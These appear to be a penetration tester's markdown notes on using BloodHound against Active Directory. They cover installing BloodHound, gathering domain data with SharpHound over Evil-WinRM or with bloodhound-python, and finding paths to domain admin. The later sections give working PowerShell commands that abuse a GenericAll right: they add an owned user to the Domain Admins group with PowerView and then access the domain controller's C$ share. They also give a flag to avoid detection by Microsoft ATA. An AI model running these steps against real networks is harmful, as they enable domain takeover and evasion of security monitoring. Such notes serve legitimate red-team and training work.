## Installation on arch linux (may be old)

- install jre openjdk 8

- `export JAVA_HOME="/usr/lib/jvm/java-8-openjdk/jre"`

- `archlinux-java set java8-openjdk/jre`

- `export NEO4J_HOME="/usr/share/java/neo4j"`

- `neo4j console`

- change password if you want

- then launch bloodhound

---

## Launch it

- sudo bloodhound


---

## 2 ways of collecting data from many others : 

### Sharphound and evil winrm

- go to the folder of the sharphound ps1
- connect to the machine with evilwinrm
- then upload sharphound.ps1 and launch it : 
```
upload \<absolute_path_to_the_file\>
$pass = convertto-securestring 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('user', $pass)
```
- here, do not forget to add the domain the user before if you need to access to a domain (`ipconfig /all dns primary suffix`)
```
Import-Module <path to sharphound.ps1>;
Invoke-BloodHound -CollectionMethod All -Credential $cred -JSONFolder <folder>
```

- Avoid detections like Microsoft Advanced Threat Analytics (ATA) : `-ExcludeDC`


### Use bloodhound-python (bloodhound.py) to do it remotely without having a shell on the machine

- `bloodhound-python -u \<user\>@DOMAIN.DOMAIN -p \<pass\> -ns \<ip of the dns\> -d \<ip of the dc\> -c All`

### Ingest it

- then transfer it on the machine where there's bloodhound installed if needed

- in bloodhound click on import data

- then in the left hand corner, click on the icon and queries

- Select whatever you want (find all domain admins, find shortest paths to domain admins, map domains trusts...)

---

## What to do

- Enter your user then the admin to know if you can go to admin
- Find shortest path to admin
- Find shortest path to kerberoastable user , and if the admin is printed, use GetUSerSPN
- click on the link and then help to know how to go to the next level

---

## Shortest path from a user to another

- Enter the user you owned in the search bar
- Right click on it, owned user
- Enter others in the search bar
- and right click, shortest path to here !!!

---


## Generic all (Link in bloodhound)

With that account owned and the link generic all to domain admins, you have to add it into the Domain Admins group. I’ll upload PowerView.ps1 and import it:
```
*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
Info: Uploading PowerView.ps1 to C:\programdata\PowerView.ps1

*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
```

- Now I’ll create a PSCredential object, and then add the user to Domain Admins:

```
*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString '<pass of the user>' -AsPlainText -Force
*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('<suffix domain name>\<user>', $pass)
*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'Domain Admins' -Members '<user>' -Credential $cred
```

- Tips : for the suffix domain name : `ipconfig /all command`

To find the name of the DC, use this query in bloodhound : `Find Principals with DCSync Rights`, and you'll see the DC :



![4ad65073e0224914bed0d907a7d3fe07.png](../../_resources/3db5d64987fb4f6191d599abe42e7ef2.png)



As the user is now a domain admin, we can access the c$ share on the DC:

```
*Evil-WinRM* PS C:\programdata> net use \\<dc name>.<suffix domain name>\c$ /u:<suffix domain name>\<user> '<pass>'

*Evil-WinRM* PS C:\programdata> dir \\<dc name>.<suffix domain name>\c$\users\
```